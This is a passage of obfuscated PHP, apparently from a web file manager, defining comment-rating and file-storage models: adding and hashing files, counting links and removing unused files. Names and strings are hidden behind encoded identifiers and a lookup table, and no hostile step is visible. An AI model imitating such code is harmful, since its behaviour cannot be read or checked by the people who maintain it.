=> $ìğĞ¡„ë[12], $ìğĞ¡„ë[190] => $ÒÅ¿›”ï, $ìğĞ¡„ë[573] => $÷­ÌşƒŞ, $ìğĞ¡„ë[2028] => 0, $ìğĞ¡„ë[2027] => 0); return $this->add($ô¬¥­ÃÆ); } public function starTargetCount($áâ¥°»Ÿ, $¢î£ïµá) { $ôÃÜîÓ’ =& $_SERVER[™¸œØ®Ü]; $¹ãü“¥ = $¢î£ïµá + self::TYPE_STAR_OFFSET; $â¥Ú³¦Œ = $this->commentCount($áâ¥°»Ÿ, $¹ãü“¥); $ÓÈõş· = $this->commentCount($áâ¥°»Ÿ, $¹ãü“¥, USER_ID); return array($ôÃÜîÓ’[2030] => $â¥Ú³¦Œ, $ôÃÜîÓ’[2031] => $ÓÈõş·); } public function starTargetUserList($áÌ¶›ºá, $¶å¿æİ“) { $ºå­ƒ =& $_SERVER[™¸œØ®Ü]; $œä­šÏ÷ = $áÌ¶›ºá + self::TYPE_STAR_OFFSET; $ëı§ö„Ô = array($ºå­ƒ[573] => $¶å¿æİ“, $ºå­ƒ[190] => $œä­šÏ÷); $‹ÃÒäüı = $this->where($ëı§ö„Ô)->count(); $‹‚¯‰­Û = array($ºå­ƒ[334] => $‹ÃÒäüı, $ºå­ƒ[2032] => array()); if (!$‹ÃÒäüı) { return $‹‚¯‰­Û; } $¡Ñğåì— = $this->field($ºå­ƒ[1795])->where($ëı§ö„Ô)->limit(500)->select(); $¡Ñğåì— = array_to_keyvalue($¡Ñğåì—, $ºå­ƒ[12], $ºå­ƒ[1795]); $‹‚¯‰­Û[$ºå­ƒ[2032]] = Model($ºå­ƒ[581])->userListInfo($¡Ñğåì—); return $‹‚¯‰­Û; } public function prasiseUserList($Å£½Œâ) { $ç¬Ëóé‡ =& $_SERVER[™¸œØ®Ü]; $Á£’¯İç = array($ç¬Ëóé‡[2033] => $Å£½Œâ); $¨ô¯¶ = $this->where($Á£’¯İç)->find(); $çñŒ§õ = _get($¨ô¯¶, $ç¬Ëóé‡[2028], 0); $¾Ñ¥Šš³ = array($ç¬Ëóé‡[334] => $çñŒ§õ, $ç¬Ëóé‡[2032] => array()); if (!$çñŒ§õ) { return $¾Ñ¥Šš³; } $ú²…Ÿ¬ = Model($ç¬Ëóé‡[2034])->field($ç¬Ëóé‡[1795])->where($Á£’¯İç)->limit(500)->select(); $ú²…Ÿ¬ = array_to_keyvalue($ú²…Ÿ¬, $ç¬Ëóé‡[12], $ç¬Ëóé‡[1795]); $¾Ñ¥Šš³[$ç¬Ëóé‡[2032]] = Model($ç¬Ëóé‡[581])->userListInfo($ú²…Ÿ¬); return $¾Ñ¥Šš³; } public function remove($¾È™äíÓ) { $ûŞ±êÀ =& $_SERVER[™¸œØ®Ü]; $¡Ü ¢“… = array($ûŞ±êÀ[2026] => $¾È™äíÓ); $ŒâêÊÏ = $this->where($¡Ü ¢“…)->find(); if ($ŒâêÊÏ[$ûŞ±êÀ[2025]]) { $this->where(array($ûŞ±êÀ[2026] => $ŒâêÊÏ[$ûŞ±êÀ[2025]]))->setAdd($ûŞ±êÀ[2027], -1); } return $this->where($¡Ü ¢“…)->delete(); } public function edit($²¬í¸¨ˆ, $ß¡Ãú¬) { $ìÍ’µØƒ =& $_SERVER[™¸œØ®Ü]; $‡ä¡—¡É = array($ìÍ’µØƒ[2026] => $²¬í¸¨ˆ); return $this->where($‡ä¡—¡É)->save(array($ìÍ’µØƒ[2035] => $ß¡Ãú¬)); } public function prasise($Æûë®Ÿõ) { $ ©ûÏ =& $_SERVER[™¸œØ®Ü]; $£·´“Ññ = Model($ ©ûÏ[2036]); $‘ÒÆß¡ = array($ ©ûÏ[2026] => $Æûë®Ÿõ, $ ©ûÏ[1786] => USER_ID); $æÙĞÙàÈ = $£·´“Ññ->where($‘ÒÆß¡)->find(); if (!$æÙĞÙàÈ) { $£·´“Ññ->add($‘ÒÆß¡); $Ş’»ÔöŒ = $this->where(array($ ©ûÏ[2026] => $Æûë®Ÿõ))->setAdd($ ©ûÏ[2028], 1); } else { $£·´“Ññ->where($‘ÒÆß¡)->delete(); $Ş’»ÔöŒ = $this->where(array($ ©ûÏ[2026] => $Æûë®Ÿõ))->setAdd($ ©ûÏ[2028], -1); } return $Ş’»ÔöŒ; } public function targetInfo($‘îµ’¹¥, $¨Üò‘À) { $¥Š§æéš =& $_SERVER[™¸œØ®Ü]; $ÖÃØìú = array($¥Š§æéš[655] => $‘îµ’¹¥, $¥Š§æéš[656] => $¨Üò‘À); $£·¸Ÿ‘î = $this->where($ÖÃØìú)->count(); $ï¬Í¡¡ = "\122\111\x47\110\124\40\x4a\x4f\x49\116\x20{$this->tablePrefix}\x63\157\x6d\155\145\x6e\x74\137\160\x72\141\x69\163\x65\40\163\164\x61\x72\40\157\x6e\x20\143\157\155\155\x65\x6e\164\x2e\143\157\x6d\155\145\x6e\x74\x49\104\x20\75\x20\163\x74\x61\162\56\x63\157\x6d\155\x65\156\x74\x49\x44"; $ºï«Ú­ä = $this->alias($¥Š§æéš[431])->where($ÖÃØìú)->join($ï¬Í¡¡, $¥Š§æéš[2037])->count(); $óè®Úë‡ = array($¥Š§æéš[2038] => $£·¸Ÿ‘î, $¥Š§æéš[2039] => $ºï«Ú­ä); return $óè®Úë‡; } public function listData($†Áèšı÷) { $’†¨à™ù =& $_SERVER[™¸œØ®Ü]; if (isset($†Áèšı÷[$’†¨à™ù[2040]])) { if ($†Áèšı÷[$’†¨à™ù[2040]]) { $†Áèšı÷[$’†¨à™ù[2033]] = array($’†¨à™ù[1110], intval($†Áèšı÷[$’†¨à™ù[2040]])); } unset($†Áèšı÷[$’†¨à™ù[2040]]); } if (isset($†Áèšı÷[$’†¨à™ù[2041]])) { if ($†Áèšı÷[$’†¨à™ù[2041]]) { $†Áèšı÷[$’†¨à™ù[2033]] = array($’†¨à™ù[1107], intval($†Áèšı÷[$’†¨à™ù[2041]])); } unset($†Áèšı÷[$’†¨à™ù[2041]]); } return $this->_listData($†Áèšı÷); } private function _listData($¯‰–¥÷ı) { $úˆ²· ù =& $_SERVER[™¸œØ®Ü]; $€Ñ×‡è€ = $this->where($¯‰–¥÷ı)->_makeOrder()->selectPage(100); $this->_listAppendParent($€Ñ×‡è€[$úˆ²· ù[447]]); $this->_listAppendUser($€Ñ×‡è€[$úˆ²· ù[447]]); $this->_listAppendMeta($€Ñ×‡è€[$úˆ²· ù[447]]); return $€Ñ×‡è€; } private function _makeOrder() { $áá­§ÎÆ =& $_SERVER[™¸œØ®Ü]; $½É²Ûãû = array($áá­§ÎÆ[2028], $áá­§ÎÆ[2027], $áá­§ÎÆ[233]); $Ç†­ê¸ = Input::get($áá­§ÎÆ[532], $áá­§ÎÆ[7], $áá­§ÎÆ[499], $½É²Ûãû); $úŸäó¾ = Input::get($áá­§ÎÆ[533], $áá­§ÎÆ[7], $áá­§ÎÆ[1788], array($áá­§ÎÆ[2042], $áá­§ÎÆ[528])); $Şê¤òâ® = $Ç†­ê¸ . $áá­§ÎÆ[53] . $úŸäó¾; return $this->order($Şê¤òâ®); } private function _listAppendParent(&$éòƒØ¢Ö) { $¨üè—×• =& $_SERVER[™¸œØ®Ü]; $’Öîêü = array_unique(array_to_keyvalue($éòƒØ¢Ö, $¨üè—×•[12], $¨üè—×•[2025])); $’Öîêü = array_remove_value($’Öîêü, $¨üè—×•[230]); if (!$’Öîêü) { return; } $îõíá = $this->where(array($¨üè—×•[2026] => array($¨üè—×•[7], $’Öîêü)))->select(); $îõíá = array_to_keyvalue($îõíá, $¨üè—×•[2033]); foreach ($éòƒØ¢Ö as &$–¤ÌúêÒ) { if (isset($îõíá[$–¤ÌúêÒ[$¨üè—×•[2025]]])) { $–¤ÌúêÒ[$¨üè—×•[2043]] = $îõíá[$–¤ÌúêÒ[$¨üè—×•[2025]]]; } } unset($–¤ÌúêÒ); } private function _listAppendUser(&$˜çÜ’âÌ) { $Ï¨´€áÄ =& $_SERVER[™¸œØ®Ü]; $¾õ“Ÿ¤ = array_unique(array_to_keyvalue($˜çÜ’âÌ, $Ï¨´€áÄ[12], $Ï¨´€áÄ[1795])); $¾õ“Ÿ¤ = array_remove_value($¾õ“Ÿ¤, $Ï¨´€áÄ[230]); if (count($¾õ“Ÿ¤) == 0) { return; } foreach ($˜çÜ’âÌ as $ı§šïäõ) { if (isset($ı§šïäõ[$Ï¨´€áÄ[2043]])) { $¾õ“Ÿ¤[] = $ı§šïäõ[$Ï¨´€áÄ[2043]][$Ï¨´€áÄ[1795]]; } } $ÂÕ‡æ÷Û = Model($Ï¨´€áÄ[601])->userListInfo($¾õ“Ÿ¤); foreach ($˜çÜ’âÌ as &$ı§šïäõ) { $ı§šïäõ[$Ï¨´€áÄ[669]] = $ÂÕ‡æ÷Û[$ı§šïäõ[$Ï¨´€áÄ[1795]]]; if (isset($ı§šïäõ[$Ï¨´€áÄ[2043]])) { $ı§šïäõ[$Ï¨´€áÄ[2043]][$Ï¨´€áÄ[669]] = $ÂÕ‡æ÷Û[$ı§šïäõ[$Ï¨´€áÄ[2043]][$Ï¨´€áÄ[1795]]]; } } unset($ı§šïäõ); } private function _listAppendMeta(&$–èíŸŠ) { $…Øœİåš =& $_SERVER[™¸œØ®Ü]; $ÈÖÉˆáŒ = array_unique(array_to_keyvalue($–èíŸŠ, $…Øœİåš[12], $…Øœİåš[2033])); $ÈÖÉˆáŒ = array_remove_value($ÈÖÉˆáŒ, $…Øœİåš[230]); if (!$ÈÖÉˆáŒ) { return; } foreach ($–èíŸŠ as $…¢ç£¼î) { if (isset($…¢ç£¼î[$…Øœİåš[2043]])) { $ÈÖÉˆáŒ[] = $…¢ç£¼î[$…Øœİåš[2043]][$…Øœİåš[2033]]; } } $ëÑàËš = $this->metaList($ÈÖÉˆáŒ); if (!$ëÑàËš) { return !1; } foreach ($–èíŸŠ as &$…¢ç£¼î) { $…¢ç£¼î[$…Øœİåš[543]] = $ëÑàËš[$…¢ç£¼î[$…Øœİåš[2033]]]; if (isset($…¢ç£¼î[$…Øœİåš[2043]])) { $…¢ç£¼î[$…Øœİåš[2043]][$…Øœİåš[543]] = $ëÑàËš[$…¢ç£¼î[$…Øœİåš[2043]][$…Øœİåš[2033]]]; } } unset($…¢ç£¼î); } private function metaList($ğ¨‚çÌ) { $Şå†Ù½Ì =& $_SERVER[™¸œØ®Ü]; if (!$ğ¨‚çÌ) { return array(); } $š³»””¼ = array($Şå†Ù½Ì[2033] => array($Şå†Ù½Ì[7], $ğ¨‚çÌ)); $˜¾äÒÎŸ = Model($Şå†Ù½Ì[2044])->where($š³»””¼)->select(); $˜¾äÒÎŸ = array_to_keyvalue_group($˜¾äÒÎŸ, $Şå†Ù½Ì[2033]); foreach ($˜¾äÒÎŸ as $ëõŞ–‘Í => $Ñ–¹Åûè) { $¨ã“à®˜ = array(); foreach ($Ñ–¹Åûè as $íóƒî¨Ö) { $¨ã“à®˜[$íóƒî¨Ö[$Şå†Ù½Ì[97]]] = $íóƒî¨Ö[$Şå†Ù½Ì[452]]; } $˜¾äÒÎŸ[$ëõŞ–‘Í] = $¨ã“à®˜; } return $˜¾äÒÎŸ ? $˜¾äÒÎŸ : array(); } public function removeTarget($¶˜›ºû, $‚Š½é§â) { $›ùĞ¡Ü¢ =& $_SERVER[™¸œØ®Ü]; if (!$‚Š½é§â) { return !0; } $‚Š½é§â = is_array($‚Š½é§â) ? $‚Š½é§â : array($‚Š½é§â); $ûòÅÛş¸ = array($›ùĞ¡Ü¢[190] => $¶˜›ºû, $›ùĞ¡Ü¢[573] => array($›ùĞ¡Ü¢[7], $‚Š½é§â)); $Ú°„©ö = $this->field($›ùĞ¡Ü¢[2033])->where($ûòÅÛş¸)->select(); $¹›€Ó¯½ = array_to_keyvalue($Ú°„©ö, $›ùĞ¡Ü¢[12], $›ùĞ¡Ü¢[2033]); if (!$¹›€Ó¯½) { return !0; } $ûòÅÛş¸ = array($›ùĞ¡Ü¢[2033] => array($›ùĞ¡Ü¢[7], $¹›€Ó¯½)); $this->where($ûòÅÛş¸)->delete(); Model($›ùĞ¡Ü¢[2036])->where($ûòÅÛş¸)->delete(); Model($›ùĞ¡Ü¢[2045])->where($ûòÅÛş¸)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\137\146\x69\154\145\137\143\x6f\x6e\x74\145\x6e\x74\163"; protected $dataAuto = array(array("\143\x72\x65\x61\164\145\x54\x69\x6d\x65", "\164\x69\x6d\x65", "\x69\x6e\163\145\162\164", "\x66\165\156\143\x74\151\x6f\156")); } class FileModel extends ModelBase { protected $tableName = "\151\157\137\146\151\x6c\145"; protected $tableMeta = array("\164\x61\142\x6c\x65\116\x61\155\x65" => "\151\x6f\x5f\x66\151\x6c\145\137\155\x65\164\x61", "\x6d\145\x74\141\x46\x69\145\x6c\x64" => "\x66\151\x6c\145\x49\104"); public function fileInfo($„©§³êÖ) { $úÅ¢ØŸª =& $_SERVER[™¸œØ®Ü]; static $·‹¶ÎÙÄ = array(); if (!isset($·‹¶ÎÙÄ[$„©§³êÖ])) { $˜¤ ¬íÛ = $úÅ¢ØŸª[2046]; $ÛÑøşœ = Model($úÅ¢ØŸª[548])->field($˜¤ ¬íÛ)->where(array($úÅ¢ØŸª[546] => $„©§³êÖ))->find(); $·‹¶ÎÙÄ[$„©§³êÖ] = $ÛÑøşœ; } return $·‹¶ÎÙÄ[$„©§³êÖ]; } public function addFileByContent($†¼š«‡» = '', $‚ô¨ò = '') { $¬¸ÄÃºŸ =& $_SERVER[™¸œØ®Ü]; $®İí© = TEMP_PATH . $¬¸ÄÃºŸ[2047]; if (!is_dir($®İí©)) { mk_dir($®İí©); } $…¬ãÔƒ = $®İí© . $¬¸ÄÃºŸ[2048] . rand_string(16); $½ÏÓÔÛ· = file_put_contents($…¬ãÔƒ, $†¼š«‡»); if ($½ÏÓÔÛ· === !1 || strlen($†¼š«‡») != $½ÏÓÔÛ·) { return !1; } $·Î¯•Ğ£ = $this->addFile($…¬ãÔƒ, $‚ô¨ò, !0); if (file_exists($…¬ãÔƒ)) { @unlink($…¬ãÔƒ); } return $·Î¯•Ğ£; } public function createFileName($ËÈ˜ü»Ã, $ƒ†¨¯†Û = false, $ä”Œéø¡ = false) { $Ù€ˆñø =& $_SERVER[™¸œØ®Ü]; $ƒÏù¶Éç = IO::init($Ù€ˆñø[8]); $Òªšß½ˆ = $this->makeFilePath($ËÈ˜ü»Ã, $ƒÏù¶Éç, $ƒ†¨¯†Û, $ä”Œéø¡); $ÉÀ˜¨¥ö = $ƒÏù¶Éç->pathFather($Òªšß½ˆ); static $ı´Ä“²µ = false; $Æ¡Ÿ‘Öğ = $Ù€ˆñø[2049] . md5($ÉÀ˜¨¥ö); if (!$ı´Ä“²µ && !Cache::get($Æ¡Ÿ‘Öğ)) { $ı´Ä“²µ = !0; $ß¯´°şŞ = IO::mkdir($ÉÀ˜¨¥ö); if (!IO::exist($ß¯´°şŞ . $Ù€ˆñø[884])) { IO::mkfile($ß¯´°şŞ . $Ù€ˆñø[884]); } Cache::set($Æ¡Ÿ‘Öğ, 1, 3600 * 2); } return $Òªšß½ˆ; } public function makeFilePath($ôğüı¥‰, $ÓÙ²ùë, $Øá¶²î› = false, $âŠ§ä²¾ = false) { $Öíàğ¢ =& $_SERVER[™¸œØ®Ü]; $¯˜ğ‘òÌ = Model($Öíàğ¢[855])->get($Öíàğ¢[2050]); $Ò…€Ïæ¥ = KodIO::defaultIO() . date($Öíàğ¢[2051]); $æÎëş€ğ = $Ò…€Ïæ¥ . rand_string(5) . short_id(100); $ôğüı¥‰ = str_replace($Öíàğ¢[8], $Öíàğ¢[11], KodIO::clear($ôğüı¥‰)); $»¹ÒîÌÒ = $ÓÙ²ùë->ext($ôğüı¥‰); if (!$ôğüı¥‰) { $¯˜ğ‘òÌ = $Öíàğ¢[861]; } switch ($¯˜ğ‘òÌ) { case $Öíàğ¢[2052]: if ($»¹ÒîÌÒ) { $æÎëş€ğ = $æÎëş€ğ . $Öíàğ¢[10] . $»¹ÒîÌÒ; } if ($»¹ÒîÌÒ == $Öíàğ¢[1988]) { $æÎëş€ğ .= $Öíàğ¢[1310]; } break; case $Öíàğ¢[2053]: $ØèÆ¯­Ù = Model($Öíàğ¢[855])->get($Öíàğ¢[856]); $©ãÅÖÁ = substr(md5($Öíàğ¢[857] . $ØèÆ¯­Ù . date($Öíàğ¢[834])), 0, 8); $¸ë˜™”ø = KodIO::defaultDriver(); $Ò…€Ïæ¥ = $Öíàğ¢[1341] . $¸ë˜™”ø[$Öíàğ¢[477]] . $Öíàğ¢[486] . date($Öíàğ¢[2054]) . $©ãÅÖÁ . $Öíàğ¢[8]; if ($»¹ÒîÌÒ == $Öíàğ¢[1988]) { $ôğüı¥‰ .= $Öíàğ¢[1310]; } $°ü¿Ò÷ó = $Öíàğ¢[2055] . $Ò…€Ïæ¥ . $ôğüı¥‰; CacheLock::lock($°ü¿Ò÷ó); $æÎëş€ğ = $Ò…€Ïæ¥ . $ôğüı¥‰; if (IO::exist($Ò…€Ïæ¥ . $ôğüı¥‰)) { $Õ«­ËÏ = substr($ôğüı¥‰, 0, strlen($ôğüı¥‰) - strlen($»¹ÒîÌÒ)); $×Ññ½¼á = $âŠ§ä²¾ ? substr($âŠ§ä²¾, 0, 5) : ($Øá¶²î› ? substr($Øá¶²î›, 0, 5) : rand_string(5)); $æÎëş€ğ = $Ò…€Ïæ¥ . $Õ«­ËÏ . $×Ññ½¼á; if ($»¹ÒîÌÒ) { $æÎëş€ğ = $æÎëş€ğ . $Öíàğ¢[10] . $»¹ÒîÌÒ; } } if (IO::isOsDriver($æÎëş€ğ) && !IO::isUploadServer($æÎëş€ğ)) { if (IO::exist($æÎëş€ğ)) { CacheLock::unlock($°ü¿Ò÷ó); return $æÎëş€ğ; } $áİÚ•€£ = IO::setContent($æÎëş€ğ, $Öíàğ¢[12]); if (!$áİÚ•€£) { show_json($Öíàğ¢[2056], !1); } } CacheLock::unlock($°ü¿Ò÷ó); break; case $Öíàğ¢[861]: break; default: break; } return $æÎëş€ğ; } public function addFileByRemote($Şœ¿½Ëã, $ÄéÀØÌş, $’µŞ¾ÕŸ = array()) { $òğü¡¡ş =& $_SERVER[™¸œØ®Ü]; if (!IO::exist($Şœ¿½Ëã)) { return !1; } $„ÂÜ›Ş = $’µŞ¾ÕŸ[$òğü¡¡ş[551]] ? $’µŞ¾ÕŸ[$òğü¡¡ş[551]] : $òğü¡¡ş[12]; $”®§èÇ€ = IO::hashMd5($Şœ¿½Ëã, $„ÂÜ›Ş); $š÷­øâó = KodIO::defaultDriver(); $ü²¥û¢Û = array($òğü¡¡ş[624] => IO::size($Şœ¿½Ëã), $òğü¡¡ş[2057] => 1, $òğü¡¡ş[496] => $ÄéÀØÌş, $òğü¡¡ş[898] => $š÷­øâó[$òğü¡¡ş[477]], $òğü¡¡ş[497] => $Şœ¿½Ëã, $òğü¡¡ş[2058] => $’µŞ¾ÕŸ[$òğü¡¡ş[679]] ? $’µŞ¾ÕŸ[$òğü¡¡ş[679]] : IO::hashSimple($Şœ¿½Ëã), $òğü¡¡ş[2059] => $”®§èÇ€ ? $”®§èÇ€ : $„ÂÜ›Ş); if ($áùÆ¡¸Ÿ = $this->addFileCheckExist($ü²¥û¢Û[$òğü¡¡ş[679]], $ü²¥û¢Û[$òğü¡¡ş[551]], $ü²¥û¢Û[$òğü¡¡ş[79]])) { return $áùÆ¡¸Ÿ; } return $this->addFileData($ü²¥û¢Û); } private function addFileData($ä‰¥×Ù°) { $­Ó‘¼¯ =& $_SERVER[™¸œØ®Ü]; if (!$ä‰¥×Ù°) { return !1; } $ä‰¥×Ù°[$­Ó‘¼¯[79]] = intval($ä‰¥×Ù°[$­Ó‘¼¯[79]]); if (!$ä‰¥×Ù°[$­Ó‘¼¯[79]] && strlen($ä‰¥×Ù°[$­Ó‘¼¯[679]]) > 32) { $ä‰¥×Ù°[$­Ó‘¼¯[79]] = intval(substr($ä‰¥×Ù°[$­Ó‘¼¯[679]], 32)); } $‡»ì§ŠÆ = $this->add($ä‰¥×Ù°); return $this->find($‡»ì§ŠÆ); } public function addFile($ªªşÍÒà, $Ç×ëõÚÇ, $àù“ØÏË = false) { $Ş¢Ò¾ë =& $_SERVER[™¸œØ®Ü]; $ùá¢úÃ = IO::hashSimple($ªªşÍÒà); $Ó‰¿§—Ğ = IO::size($ªªşÍÒà); $îŠóöÅÃ = $Ó‰¿§—Ğ <= 1024 * 1024 * 10 ? IO::hashMd5($ªªşÍÒà) : $Ş¢Ò¾ë[12]; $Í™ã—èÕ = $Ş¢Ò¾ë[2060] . $ùá¢úÃ; CacheLock::lock($Í™ã—èÕ); if ($îŠóöÅÃ && $ùá¢úÃ) { $œéÉûº = $this->addFileCheckExist($ùá¢úÃ, $îŠóöÅÃ, $Ó‰¿§—Ğ); if ($œéÉûº) { CacheLock::unlock($Í™ã—èÕ); return $œéÉûº; } } $ÎÚÇİ® = $this->addFileMake($ªªşÍÒà, $Ó‰¿§—Ğ, $ùá¢úÃ, $îŠóöÅÃ, $Ç×ëõÚÇ, $àù“ØÏË); $àÛõ‡ÀÑ = $this->addFileData($ÎÚÇİ®); if (!$àÛõ‡ÀÑ) { return !1; } CacheLock::unlock($Í™ã—èÕ); if (!$îŠóöÅÃ && $àÛõ‡ÀÑ) { $this->fileMd5Check($àÛõ‡ÀÑ); } return $àÛõ‡ÀÑ; } public function fileMd5Check($ø´º´ÔÍ) { $öùÊë¹Ü =& $_SERVER[™¸œØ®Ü]; $ŸÙ‚ÃÄĞ = array($ø´º´ÔÍ[$öùÊë¹Ü[545]], $ø´º´ÔÍ[$öùÊë¹Ü[87]]); $òˆ»ˆá¶ = $öùÊë¹Ü[2061] . $ø´º´ÔÍ[$öùÊë¹Ü[87]]; $Ï¼ ±× = $öùÊë¹Ü[2062] . $ø´º´ÔÍ[$öùÊë¹Ü[545]]; TaskQueue::add($öùÊë¹Ü[2063], $ŸÙ‚ÃÄĞ, $òˆ»ˆá¶, $Ï¼ ±×); } public function fileMd5Set($ûğ· ŠÀ, $±®«çÒ¸) { $Ü¤Ğ²Æ« =& $_SERVER[™¸œØ®Ü]; $Ò‰«Ç™ = $this->find($ûğ· ŠÀ); if (!$Ò‰«Ç™ || $Ò‰«Ç™[$Ü¤Ğ²Æ«[551]]) { return; } $ÜÙµ­¶‚ = IO::hashMd5($±®«çÒ¸); if (!$ÜÙµ­¶‚) { return $Ü¤Ğ²Æ«[12]; } $this->where(array($Ü¤Ğ²Æ«[545] => $ûğ· ŠÀ))->save(array($Ü¤Ğ²Æ«[551] => $ÜÙµ­¶‚)); } public function addFileMake($±¶’¦ï­, $ÅÉåÉ¶Œ, $Àê‘¹‡, $ĞƒİŸóª, $¶Š˜ôõß, $“ß—ÁÃŒ) { $ÊùéÃî­ =& $_SERVER[™¸œØ®Ü]; $†ãÕÜœö = $this->createFileName($¶Š˜ôõß, $Àê‘¹‡, $ĞƒİŸóª); $êøÆÕó­ = get_path_father($†ãÕÜœö); $ıüûìåï = get_path_this($†ãÕÜœö); if ($“ß—ÁÃŒ) { $‹¿©£ãÍ = IO::move($±¶’¦ï­, $êøÆÕó­, !1, $ıüûìåï); } else { $‹¿©£ãÍ = IO::copy($±¶’¦ï­, $êøÆÕó­, !1, $ıüûìåï); } if (!$‹¿©£ãÍ || IO::size($†ãÕÜœö) != $ÅÉåÉ¶Œ) { return !1; } $ ³‘Ûº = KodIO::defaultDriver(); $Çã´ïÏğ = array($ÊùéÃî­[624] => $ÅÉåÉ¶Œ, $ÊùéÃî­[2057] => 1, $ÊùéÃî­[496] => $¶Š˜ôõß, $ÊùéÃî­[898] => $ ³‘Ûº[$ÊùéÃî­[477]], $ÊùéÃî­[497] => $†ãÕÜœö, $ÊùéÃî­[2058] => $Àê‘¹‡, $ÊùéÃî­[2059] => $ĞƒİŸóª); return $Çã´ïÏğ; } public function addFileCheckExist($±˜ÉÒÜã, $˜òÑû¸æ, $ß¤áâ‚Ø) { $ç©„†û =& $_SERVER[™¸œØ®Ü]; $Šóáª½æ = $this->findByHash($±˜ÉÒÜã, $˜òÑû¸æ); if (!$Šóáª½æ) { return !1; } $ŒüßâŒ˜ = array($ç©„†û[2057] => intval($Šóáª½æ[$ç©„†û[2064]]) + 1, $ç©„†û[624] => $ß¤áâ‚Ø); $this->where(array($ç©„†û[546] => $Šóáª½æ[$ç©„†û[545]]))->save($ŒüßâŒ˜); return $Šóáª½æ; } public function remove($Ê’î ÁÔ) { $this->linkCountChange($Ê’î ÁÔ, !1); $this->clearEmpty(); return !0; } public function linkAdd($ñœ»÷Ö°) { $this->linkCountChange($ñœ»÷Ö°, !0); } public function linkCountChange($şÒÄµú, $ºŒß¹Ø§) { $òÃÍÛº· =& $_SERVER[™¸œØ®Ü]; if (!$şÒÄµú) { return; } if (!is_array($şÒÄµú)) { $şÒÄµú = array($şÒÄµú); } $ØµÖŞ°³ = array(); foreach ($şÒÄµú as $¢õ®ŞÇ‹) { $Éï•Èò¾ = $¢õ®ŞÇ‹ . $òÃÍÛº·[12]; if (!$ØµÖŞ°³[$Éï•Èò¾]) { $ØµÖŞ°³[$Éï•Èò¾] = 0; } $ØµÖŞ°³[$Éï•Èò¾]++; } $¤‚«‹­¡ = array(); foreach ($ØµÖŞ°³ as $¢õ®ŞÇ‹ => $’Şã‰¿Ó) { $Éï•Èò¾ = $’Şã‰¿Ó . $òÃÍÛº·[12]; if (!$¤‚«‹­¡[$Éï•Èò¾]) { $¤‚«‹­¡[$Éï•Èò¾] = array(); } $¤‚«‹­¡[$Éï•Èò¾][] = $¢õ®ŞÇ‹; } foreach ($¤‚«‹­¡ as $’Şã‰¿Ó => $éùú¶©•) { if (!$éùú¶©•) { continue; } $’Şã‰¿Ó = $ºŒß¹Ø§ ? $’Şã‰¿Ó : -intval($’Şã‰¿Ó); $œ¿öÅ = array($òÃÍÛº·[545] => array($òÃÍÛº·[7], $éùú¶©•)); if ($’Şã‰¿Ó < 0) { $œ¿öÅ[$òÃÍÛº·[2064]] = array($òÃÍÛº·[1111], abs($’Şã‰¿Ó)); } $this->where($œ¿öÅ)->setAdd($òÃÍÛº·[2064], $’Şã‰¿Ó); } } public function findByHash($ÉıÕİÒ, $¦õãâÎé = false) { $İæÛÑ· =& $_SERVER[™¸œØ®Ü]; if (!$ÉıÕİÒ && !$¦õãâÎé) { return !1; } $İÁË¬óä = array($İæÛÑ·[2058] => $ÉıÕİÒ); if ($¦õãâÎé) { $İÁË¬óä = array($İæÛÑ·[2059] => $¦õãâÎé); } return $this->order($İæÛÑ·[2065])->where($İÁË¬óä)->find(); } public function clearEmpty($ÀùúÒ± = 1) { $¦Í¾È«‡ =& $_SERVER[™¸œØ®Ü]; $”á¿ÃÜ¤ = time() - 3600 * 24 * $ÀùúÒ±; $ŸÀæîŒ = $¦Í¾È«‡[2066] . $”á¿ÃÜ¤; $ı—¬Œê™ = $this->where($ŸÀæîŒ)->select(); if (!$ı—¬Œê™) { return; } $‘ã©î•Ñ = new Task($¦Í¾È«‡[2067], $¦Í¾È«‡[12], count($ı—¬Œê™)); foreach ($ı—¬Œê™ as $ÆïÈÃ÷) { $‘ã©î•Ñ->update(1); $this->resetFile($ÆïÈÃ÷); } $‘ã©î•Ñ->end(); } public function resetFile($½´“ªÕï) { $ÒˆîÍò© =& $_SERVER[™¸œØ®Ü]; $Ú¶®¿ã“ = array($ÒˆîÍò©[546] => $½´“ªÕï[$ÒˆîÍò©[545]]); $¿°¦Å = Model($ÒˆîÍò©[1440])->where($Ú¶®¿ã“)->count(); $şèı¥‡À = Model($ÒˆîÍò©[2068])->where($Ú¶®¿ã“)->count(); $ƒ²à™­ª = intval($¿°¦Å) + intval($şèı¥‡À); if ($ƒ²à™­ª == 0) { IO::remove($½´“ªÕï[$ÒˆîÍò©[87]]); Model($ÒˆîÍò©[2069])->delete($½´“ªÕï[$ÒˆîÍò©[545]]); $this->where($Ú¶®¿ã“)->delete(); $this->metaSet($½´“ªÕï[$ÒˆîÍò©[545]], null, null); write_log(ACTION . $ÒˆîÍò©[2070] . KodUser::id() . $ÒˆîÍò©[2071] . $½´“ªÕï[$ÒˆîÍò©[545]] . $ÒˆîÍò©[2072] . $½´“ªÕï[$ÒˆîÍò©[79]] . $ÒˆîÍò©[201] . $½´“ªÕï[$ÒˆîÍò©[87]], $ÒˆîÍò©[2073]); return; } if ($½´“ªÕï[$ÒˆîÍò©[2064]] != $ƒ²à™­ª) { $this->where($Ú¶®¿ã“)->save(array($ÒˆîÍò©[2057] => $ƒ²à™­ª)); } } public function storageInfo($©æ¦•¨ = false) { $İ¥ğ¡ı¿ =& $_SERVER[™¸œØ®Ü]; $­ÆÙÃ“ = $this->count() + 0.0; $ª¶öÏôó = 0; $ˆòÆÁÛ = 1; $ñÉÕë¶ = 0; $ú²üÎĞ• = 5000; for ($ƒ—¤åÜ¼ = 0; $ƒ—¤åÜ¼ < $­ÆÙÃ“; $ƒ—¤åÜ¼ = $ƒ—¤åÜ¼ + $ú²üÎĞ•) { $—¤×Ø‡ƒ = $this->limit($ƒ—¤åÜ¼, $ƒ—¤åÜ¼ + $ú²üÎĞ•)->select(); foreach ($—¤×Ø‡ƒ as $ø¶Éœ¥ì) { $ˆòÆÁÛ += $ø¶Éœ¥ì[$İ¥ğ¡ı¿[79]] * $ø¶Éœ¥ì[$İ¥ğ¡ı¿[2064]]; $ª¶öÏôó += $ø¶Éœ¥ì[$İ¥ğ¡ı¿[79]] * ($ø¶Éœ¥ì[$İ¥ğ¡ı¿[2064]] - 1); $ñÉÕë¶ += $ø¶Éœ¥ì[$İ¥ğ¡ı¿[2064]]; } } $Ïç»û¦Ä = array($İ¥ğ¡ı¿[2074] => 